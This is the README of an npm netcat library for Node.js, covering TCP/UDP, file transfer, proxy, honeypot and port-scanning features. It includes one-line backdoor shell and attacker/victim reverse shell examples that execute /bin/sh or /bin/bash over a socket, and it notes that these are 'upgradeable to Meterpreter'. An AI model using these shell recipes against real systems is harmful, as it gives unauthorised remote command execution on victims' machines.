# netcat

[![NPM Version](https://img.shields.io/npm/v/netcat.svg)](https://www.npmjs.com/package/netcat)
![node](https://img.shields.io/node/v/netcat.svg)
[![Dependency Status](https://david-dm.org/roccomuso/netcat.png)](https://david-dm.org/roccomuso/netcat)
[![JavaScript Style Guide](https://img.shields.io/badge/code_style-standard-brightgreen.svg)](https://standardjs.com)
<span class="badge-patreon"><a href="https://patreon.com/roccomuso" title="Donate to this project using Patreon"><img src="https://img.shields.io/badge/patreon-donate-yellow.svg" alt="Patreon donate button" /></a></span>

> Netcat client and server modules written in pure JavaScript for Node.js.

Fully tested modules that implement the basic netcat features. To use this as a standalone tool, install the [nc](https://github.com/roccomuso/nc) package.

| Linux/Mac | Windows |
|-----------|---------|
| [![Build Status](https://travis-ci.org/roccomuso/netcat.svg?branch=master)](https://travis-ci.org/roccomuso/netcat) | [![Build status](https://ci.appveyor.com/api/projects/status/q4x7xwtj7ga3ppo5?svg=true)](https://ci.appveyor.com/project/roccomuso/netcat) |

## What you can do :computer:

- [x] TCP & UDP
- [x] Backdoor (Reverse Shell)
- [x] Honeypot
- [x] File transfer
- [x] Port forwarding
- [x] Proxy
- [x] Web Server
- [x] Port scanning

## Enhancements

- [x] [Filter](#filter-incoming-data) incoming data.
- [ ] Crypto.
- [ ] Authentication (`.auth('pass')`).
- [ ] `allow` and `deny` specific remote IP addresses.

## Install

    $ yarn add netcat

[![NPM](https://nodei.co/npm/netcat.png?downloads=true&downloadRank=true)](https://nodei.co/npm/netcat/)

## Usage

```javascript
const NetcatServer = require('netcat/server')
const NetcatClient = require('netcat/client')
const nc = new NetcatServer()
const nc2 = new NetcatClient()
```

## Examples

This module's API follows the original netcat CLI parameters as closely as possible.

For instance: `nc -l -p 2389` is equivalent to `nc.port(2389).listen()`. Easy right?

#### Server and client connection

| Server                 | Client                             |
|------------------------|------------------------------------|
|`nc.port(2389).listen()`|`nc2.addr('127.0.0.1').port(2389).connect()`|

#### Transfer a file

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().pipe(outputStream)`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

Or vice versa, you can do the equivalent of `nc -l -p 2389 < filename.txt`. When someone connects to port `2389`, the file is sent to them:

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).serve('filename.txt').listen()`|`nc2.port(2389).connect().pipe(outputStream)`|

#### Keepalive connections

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).k().listen()`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

The server will stay alive and will not close after the first connection. (`k()` is an alias for `keepalive()`.)

#### Serve raw buffer

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().serve(Buffer.from('Hello World'))`|`nc2.port(2389).connect().on('data', console.log)`|

#### Backdoor shell

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().exec('/bin/bash')`|`process.stdin.pipe(nc2.addr('127.0.0.1').port(2389).connect().pipe(process.stdout).stream())`|

The `exec()` method executes the given command and pipes its `stdout` and `stderr` to the client socket.

#### Reverse shell

| Attacker              | Victim                           |
|---------------------|------------------------------------|
|`nc.k().port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.addr('127.0.0.1').port(2389).retry(5000).connect().exec('/bin/sh')`|

- [x] Upgradeable to Meterpreter!

#### Netcat as a proxy

Netcat can be configured as a proxy server:

```javascript
const nc = new NetcatServer()
const nc2 = new NetcatClient()
nc2.addr('google.com').port(80).connect()
nc.port(8080).k().listen().proxy(nc2.stream())
```

All traffic flowing through `localhost:8080` will be redirected to `google.com:80`.
Similarly, you can set up port forwarding by using the same host.

#### Honeypot

Pretend to be an Apache server:

```javascript
const apache = `HTTP/1.1 200 OK
Date: Sat, 27 May 2017 16:51:02 GMT
Server: Apache/2.4.7 (Ubuntu)
Cache-Control: public, max-age=0
Content-Type: text/html; charset=utf-8
Content-Length: 16894
Vary: Accept-Encoding
`
const nc = new NetcatServer()
const logFile = fs.createWriteStream('log.txt')
nc.port(80).k().listen().serve(Buffer.from(apache)).pipe(logFile)
```

#### Port scanning

The netcat client also provides basic port scan functionality.

```javascript
const nc = new NetcatClient()
nc.addr('127.0.0.1').scan('22-80', function (ports) {
 // ports: { '22': 'open', '23': 'closed' ... }
})
```

The port scanner is TCP-only. UDP scanning is not [very effective](https://en.wikipedia.org/wiki/Port_scanner#UDP_scanning). `scan(...)` also accepts an array or an integer.

#### Filter incoming data

```javascript
const nc = new NetcatServer()
nc.addr('127.0.0.1').port(8080).filter(function (chunk, enc, cb) {
  // transform upper case
  const out = chunk.toString().toUpperCase()
  this.push(Buffer.from(out))
  cb(null)
}).pipe(process.stdout).listen()
```

#### Connect to a UNIX socket file

Both the Netcat server and client support UNIX socket connections.
Let's use a Netcat client instance to connect to the Docker UNIX socket file and retrieve the list of container images.

```javascript
nc2.unixSocket('/var/run/docker.sock').enc('utf8')
  .on('data', function (res) {
    console.log(res)
  })
  .connect()
  .send('GET /images/json HTTP/1.0\r\n\r\n')
```

#### UDP listen for packets

```javascript
const nc = new NetcatServer()
nc.udp().port(2100).listen().on('data', function (rinfo, data) {
  console.log('Got', data.toString(), 'from', rinfo.address, rinfo.port)
  nc.close()
})
```

#### UDP send a packet

```javascript
const nc2 = new NetcatClient()
nc2.udp().port(2100).wait(1000).init().send('hello', '127.0.0.1')
```

Send the `hello` buffer to port `2100`, then close the client after `1000` ms.

## API

#### `port(int)` or `p(int)`

Netcat can bind to any local port, subject to privilege restrictions and ports that are already in use.

#### `address(host)` or `addr(host)`

- When used server-side: set the local address to listen to. `0.0.0.0` by default.
- When used client-side: set the remote address to connect to. `127.0.0.1` by default.

#### `listen()`

Make the UDP/TCP server listen on the previously set port.

#### `unixSocket(path)` - TCP only

Optionally, you can provide the path to a UNIX socket file and listen on it or connect to it.

#### `connect()` - TCP only

Client-side only. Let the client connect to the previously set address and port.

#### `retry(ms)` - TCP only

Client-side only. Retry connection every `ms` milliseconds when connection is lost.

#### `interval(ms)` or `i(ms)`

Client-side only. Specify a delay, in milliseconds, for sent data.

#### `waitTime(ms)` or `wait(ms)`

Set a timeout.

- A server will wait `ms` milliseconds from the first data event and close the connection if it does not receive more data.
- A client will wait `ms` milliseconds from the first sent data and close if there is no more data to send.

#### `stream()`

Return the client duplex stream reference.

#### `pipe(outStream)`

Pipe incoming data from the client to the given `outStream`.

#### `filter(transformFn)`

Filter incoming data with the given transform function, `function (chunk, enc, cb) { ... }`, before it is piped out.

**Note**: The `.on('data', cb)` data you get is not filtered. The filter only applies on the piped `.pipe(...)` stream.

**Known issue**: `through2` currently [doesn't respect](https://github.com/roccomuso/netcat/issues/4) the encoding. If you set a filter, you will get a Buffer and the `enc()` method will not be useful.

#### `serve()`

Server-side method.

The `serve` method accepts a string (indicating a file name, make sure the file exists), a readable stream, or a Buffer.
When you pass a readable stream with TCP keepalive enabled, the stream's data is cached as it is read so later clients can receive the same data.

When serving a file or a Buffer to a socket, the pipe will emit an `end` (EOF) event to the socket and close the stream.

#### `send(data [, cb|host])`

Client-side:

- in TCP: send data to the connected server. `cb` is called once the data has been sent.
- in UDP: send data to the destination address, or to the given host if provided.

Server-side:

- in TCP: not available; use `serve()` instead.
- in UDP: send data to the destination address, or to the given host if provided.

#### `end(data)` - TCP only

Client-side method. Send the given data and close the connection.

#### `close([cb])`

Close the connection, or all connections when called server-side, and call `cb` once the socket is closed.

#### `enc()`

Set an encoding. The most common ones are: `utf8`, `ascii`, `base64`, `hex`, and `binary`.

#### `protocol(prot)`

Set a custom protocol. The use of this method is discouraged. Use the methods `tcp()` and `udp()` instead. `tcp` is the default value.

#### `keepalive()` or `k()` - TCP only

Server-side method.

When you enable keepalive, the server will stay up and the `outStream` given to `pipe(outStream)` may be kept open.

By default, a UDP listener stays alive until an explicit `nc.close()`.

#### `exec()` - TCP only

The `exec()` method executes the given command and pipes its `stdout` and `stderr` to the client socket. It accepts an optional array of args as the second parameter and [spawn options](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) as the third parameter. If a pipe character (`|`) is found, the command is processed with `sh -c` on Unix-like systems or `cmd.exe /C` on Windows.

Example:

```javascript
nc.p(2389).exec('base64', ['-d']).listen()
// OR
nc.p(2389).exec('base64 | grep hello').listen()
```

#### `getClients()` - TCP only

Server-side method. Return an object listing all client socket references.

#### `proxy(duplexStream)` - TCP only

Server-side method. This method pipes the server's incoming and outgoing data to the provided `duplexStream`. It is a shortcut for both `.serve(duplexStream)` and `.pipe(duplexStream)`.

#### `output(outStream)` or `out(outStream)`

Write a hex dump of incoming or outgoing traffic to the given writable stream, `outStream`.

A row represents a chunk of at least 16 bytes by default.

The first character can be either `<` or `>`, meaning "incoming chunk" or "outgoing chunk", respectively.

#### `scan(portsInterval, cb)` - TCP only

The netcat client also provides basic port scan functionality.

The first parameter is mandatory and specifies the port or ports to scan.
It can be a single integer, a string interval (like `22-80`), or an array of integers (`[22, 23, 1880]`).
If provided, the callback receives an object like `{ '22': 'open', '23': 'closed' ... }`.

#### `init()` - UDP only

The UDP equivalent of `connect()`. This is for UDP clients only.

#### `bind(<int>)` - UDP only

Let the UDP client/server listen on the given port. It will also be used as the outgoing port if `.port(<n>)` was not called.

#### `broadcast(<dst>)` or `b(<dst>)` - UDP only

Enable broadcast for the UDP server. You can optionally specify a destination address.

#### `destination(<dst>)` - UDP only

Set a destination address. (`127.0.0.1` is the default value.)

#### `loopback()` - UDP only

Enable loopback. For instance, when a UDP server is bound to a port and sends a message to that port, it will receive the message back if loopback is enabled.

## Events

The netcat modules extend the `EventEmitter` class. You can catch some events straight from the sockets. For example, the server `data` event:

| Server              | Client                    |
|---------------------|------------------------------------|
|`nc.port(2389).listen().on('data', onData)`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

```javascript
function onData (socket, chunk) {
  console.log(socket.id, 'got', chunk) // Buffer <...>
  socket.write('hello client') // reply to the client
}
```

### Server events

- `.on('data', function (sockOrRinfo, msg) {})`

Emitted when the server receives data from clients.

- `.on('ready', cb)`

Emitted when the server successfully listens on or binds to a port.

- `.on('close', cb)`

Emitted when the server closes.

- `.on('clientClose', function (socket, hadError) {})` - **TCP only**

Called when a client disconnects from the server.
The callback receives the disconnected `socket` instance as the first parameter and a Boolean `hadError` value as the second parameter.

- `.on('connection', function (socket) {})` - **TCP only**

Emitted when a new client connects to the server.

- `.on('end', function (socket) {})` - **TCP only**

Emitted when a client ends the connection.

- `.on('timeout', function (socket) {})` - **TCP only**

Socket timeout event.

- `.on('waitTimeout', cb)`

Fired when the server remains inactive for a specified `wait(ms)` time.

- `.on('error', function (err) {})`

Emitted on error.

### Client events

- `.on('data', function (msg) {})`

Emitted when data is received from the server.

- `.on('close', cb)`

Emitted when the client closes.

- `.on('waitTimeout', cb)`

Fired when the client remains inactive for a specified `wait(ms)` time.

- `.on('connect', cb)` - **TCP only**

Emitted when the client establishes a connection with a server.

- `.on('error', function (err) {})`

Emitted on error.

## CLI usage

For standalone usage, install the [nc](https://github.com/roccomuso/nc) CLI package:

    $ npm install -g nc

Example:

    $ # Listen for inbound
    $ nc -l -p port [- options] [hostname] [port]


Available options:


- [x] `-c shell commands    as '-e'; use /bin/sh to exec [dangerous!!]`
- [x] `-e filename          program to exec after connect [dangerous!!]`
- [x] `-b                   allow broadcasts`
- [x] `-i secs              delay interval for lines sent, ports scanned (client-side)`
- [x] `-h                   show help`
- [x] `-k set               keepalive option on socket`
- [x] `-l                   listen mode, for inbound connects`
- [ ] `-n                   numeric-only IP addresses, no DNS`
- [x] `-o file              hex dump of traffic`
- [x] `-p port              local port number`
- [ ] `-r                   randomize local and remote ports`
- [ ] `-q secs              quit after EOF on stdin and delay of secs`
- [x] `-s addr              local source address`
- [x] `-u                   UDP mode`
- [x] `-U                   Listen or connect to a UNIX domain socket`
- [x] `-v                   verbose`
- [x] `-w secs              timeout for connects and final net reads`
- [x] `-z                   zero-I/O mode [used for scanning]`


## DEBUG

Debug output matches verbose mode.
You can enable it with the `verbose: true` parameter or the `DEBUG=netcat:*` environment variable.

## Tests

Run them with: `yarn test`

Coverage:

- [x] Test the `.serve(input)` method
- [x] Test the keepalive connection with `.pipe()` and `serve()`.
- [x] `serve()` accepts a string, stream, or Buffer.
- [x] `exec()` method
- [x] Backdoor shell
- [x] Proxy server
- [x] UDP.

## Author

Rocco Musolino ([@roccomuso](https://twitter.com/roccomuso))

## License

MIT
